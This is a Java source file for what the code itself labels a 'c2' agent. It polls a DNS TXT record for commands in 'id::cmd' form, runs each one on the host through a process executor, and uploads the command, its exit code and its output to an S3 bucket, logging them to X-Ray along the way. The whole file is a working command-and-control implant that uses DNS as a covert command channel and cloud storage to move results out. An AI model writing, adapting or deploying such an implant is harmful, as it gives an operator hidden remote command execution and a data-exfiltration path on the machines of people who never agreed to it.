package org.linx;

import com.amazonaws.xray.entities.Subsegment;
import software.amazon.awssdk.core.sync.RequestBody;
import software.amazon.awssdk.regions.Region;
import software.amazon.awssdk.services.s3.S3Client;
import software.amazon.awssdk.services.s3.model.PutObjectRequest;
import com.amazonaws.xray.AWSXRay;
import com.amazonaws.xray.AWSXRayRecorderBuilder;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.Map;

public class Main {

    private static final String env = "prod";

    static {
        AWSXRay.setGlobalRecorder(AWSXRayRecorderBuilder.standard().build());
    }

    public static void main(String[] args) throws Exception {
        Map<String,String> cfg;
        try (SsmConfig sc = new SsmConfig()) {
            cfg = sc.load();
        }

        String recordName = cfg.get("record_name");
        String bucket     = cfg.get("log_bucket");
        String prefix     = cfg.get("log_prefix");
        long   pollMs     = Long.parseLong(cfg.get("poll_ms"));

        if (bucket == null || bucket.isBlank())
            throw new IllegalArgumentException("Missing log bucket");

        CommandResolver resolver;
        if ("prod".equals(env)) {
            // Riktig DNS
            resolver = new DnsJavaResolver(null);
        } else {
            // Kör via API medans vi utvecklar
            String zoneId = cfg.get("zone_id");
            if (zoneId == null) throw new IllegalArgumentException("Missing zone_id");
            resolver = new Route53ApiResolver(zoneId);
        }

        S3Client s3 = S3Client.builder()
                .region(Region.of( "eu-north-1"))
                .build();

        CommandExecutor exec = new ProcessExecutor();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> System.out.println("Goodbye!")));

        while (true) {
            try {
                if ("dev".equals(env)) {
                    System.out.println("Polling for commands...");
                }
                runOnce(resolver, recordName, exec, s3, bucket, prefix);
            } catch (Exception e) {
                System.err.println("Poll error: " + e.getMessage());
            }
            Thread.sleep(pollMs);
        }
    }

    static void runOnce(CommandResolver resolver, String recordName,
                        CommandExecutor exec, S3Client s3, String bucket, String prefix) throws Exception {
        String txt = resolver.fetch(recordName);
        if (txt == null || txt.isBlank()) return;

        ParsedCommand parsed = parseTxt(txt);
        if (!Singletons.seen().firstTime(parsed.id())) return;

        AWSXRay.beginSegment("agent"); // Så vi inte skapar en ny var 5:e sekund 24/7
        try {
            Subsegment execSeg = AWSXRay.beginSubsegment("exec");
            try {
                CommandExecutor.Result res = exec.exec(parsed.cmd());
                execSeg.putAnnotation("id", parsed.id());
                execSeg.putAnnotation("exit", res.exitCode());
                execSeg.putMetadata("cmd", parsed.cmd(), "c2");
                execSeg.putMetadata("output", res.output(), "c2");

                String body = """
                # time: %s
                # id:   %s
                # cmd:  %s
                # exit: %d

                %s
                """.formatted(Instant.now(), parsed.id(), parsed.cmd(), res.exitCode(), res.output());

                Subsegment s3seg = AWSXRay.beginSubsegment("s3-put");
                try {
                    s3.putObject(
                            PutObjectRequest.builder()
                                    .bucket(bucket)
                                    .key(prefix + parsed.id() + ".txt")
                                    .build(),
                            RequestBody.fromBytes(body.getBytes(StandardCharsets.UTF_8))
                    );
                    s3seg.putAnnotation("bucket", bucket);
                    s3seg.putAnnotation("key", prefix + parsed.id() + ".txt");
                } catch (Exception e) {
                    s3seg.addException(e);
                    throw e;
                } finally {
                    AWSXRay.endSubsegment();
                }
            } catch (Exception e) {
                execSeg.addException(e);
                throw e;
            } finally {
                AWSXRay.endSubsegment();
            }
        } finally {
            AWSXRay.endSegment();
        }
    }

    static class Singletons {
        private static SeenStore SEEN;
        static SeenStore seen() {
            if (SEEN == null) SEEN = new SeenStore(new File("seen-ids.txt"));
            return SEEN;
        }
    }

    public static ParsedCommand parseTxt(String txt) {
        int sep = txt.indexOf("::");
        if (sep <= 0 || sep == txt.length() - 2) {
            throw new IllegalArgumentException("Invalid TXT record: " + txt);
        }
        String id  = txt.substring(0, sep);
        String cmd = txt.substring(sep + 2);
        return new ParsedCommand(id, cmd);
    }

    public record ParsedCommand(String id, String cmd) {}

}